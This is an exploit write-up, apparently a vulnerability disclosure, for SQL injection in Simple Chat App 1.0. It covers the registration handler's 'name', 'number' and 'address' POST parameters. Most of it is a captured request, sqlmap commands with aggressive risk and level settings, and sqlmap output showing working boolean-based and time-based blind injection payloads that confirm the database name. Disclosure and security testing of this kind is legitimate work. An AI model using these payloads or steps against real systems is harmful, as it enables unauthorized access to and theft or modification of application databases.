# Simple Chat App - SQL Injection - 2
+ **Exploit Title:** Simple Chat App - SQL Injection - 2
+ **Date:** 2024-12-05
+ **Exploit Author:** Burak Sevben
+ **Vendor Homepage:** https://code-projects.org/simple-chat-system-in-php-with-source-code/
+ **Software Link:** https://download.code-projects.org/details/55a2b6be-cd54-4114-8d04-2ba66d0bc11a 
+ **Version:** 1.0
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** Reported, waiting for CVE number.

## Description:
Simple Chat App 1.0 allows SQL Injection via the 'name','number' and 'address' parameters at "http://localhost/chat_project/register.php/" 
Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database.

## Proof of Concept(PoC):
+ Go to this address: "http://localhost/chat_project/register.php/"
+ Fill out the form and register. 
+ Capture the request via Burp Suite and send it to the Repeater.
+ Copy the request and paste it into an "r.txt" file.
+ Captured Burp request:
```
POST /chat_project/add_user.php HTTP/1.1
Host: localhost
Content-Length: 67
Cache-Control: max-age=0
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/chat_project/register.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: language=en; continueCode=5vLeVxlRzkNb47vKDPMo5Lq8wdzLtvf1Hem0jn6EZm2ygrX19BpaQWOJY3oM; welcomebanner_status=dismiss; cookieconsent_status=dismiss; PHPSESSID=mglk3dokbsuogop6o3e3gtliae
Connection: close

name=helo&email=helo%40mail.com&password=123&number=123&address=123

```
### Name
+ Use sqlmap to exploit. In sqlmap, use 'name' parameter to dump the database.
```
sqlmap -r r.txt -p name --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
---
Parameter: name (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: name=helo' RLIKE (SELECT (CASE WHEN (8824=8824) THEN 0x68656c6f ELSE 0x28 END)) AND 'VWyC'='VWyC&email=helo@mail.com&password=123&number=123&address=123

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: name=helo' AND (SELECT 7077 FROM (SELECT(SLEEP(5)))BpTg) AND 'VLCR'='VLCR&email=helo@mail.com&password=123&number=123&address=123
---
[11:25:42] [INFO] the back-end DBMS is MySQL
web application technology: PHP 8.2.12, Apache 2.4.58
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[11:25:42] [INFO] fetching current database
current database: 'tutorial_db'
```
+ current database: `tutorial_db`

![Ekran görüntüsü 2024-05-15 045403](https://github.com/BurakSevben/CVEs/assets/117217689/c5cb01f9-2cf1-4e28-b6b5-65e0df6deb0e)



### Number
+ Use sqlmap to exploit. In sqlmap, use 'number' parameter to dump the database.
```
sqlmap -r r.txt -p number --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
---
Parameter: number (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: name=helo&email=helo@mail.com&password=123&number=123' RLIKE (SELECT (CASE WHEN (5597=5597) THEN 123 ELSE 0x28 END)) AND 'zoNA'='zoNA&address=123

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: name=helo&email=helo@mail.com&password=123&number=123' AND (SELECT 1148 FROM (SELECT(SLEEP(5)))UvZO) AND 'PgGv'='PgGv&address=123
---
[11:28:05] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.58, PHP 8.2.12
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[11:28:05] [INFO] fetching current database
current database: 'tutorial_db'

```
+ current database: `tutorial_db`

![Ekran görüntüsü 2024-05-15 045627](https://github.com/BurakSevben/CVEs/assets/117217689/d7ec1a56-f6b9-4ce3-b4c7-a27e1381ab19)


### Address
+ Use sqlmap to exploit. In sqlmap, use 'address' parameter to dump the database.
```
sqlmap -r r.txt -p address --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
---
Parameter: address (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: name=helo&email=helo@mail.com&password=123&number=123&address=123' RLIKE (SELECT (CASE WHEN (3446=3446) THEN 123 ELSE 0x28 END)) AND 'rSpr'='rSpr

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: name=helo&email=helo@mail.com&password=123&number=123&address=123' AND (SELECT 5200 FROM (SELECT(SLEEP(5)))sULX) AND 'puCb'='puCb
---
[11:29:12] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.58, PHP 8.2.12
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[11:29:12] [INFO] fetching current database
current database: 'tutorial_db'

```
+ current database: `tutorial_db`

![Ekran görüntüsü 2024-05-15 045903](https://github.com/BurakSevben/CVEs/assets/117217689/2755010b-ecd9-43aa-bca1-f41575e249bb)

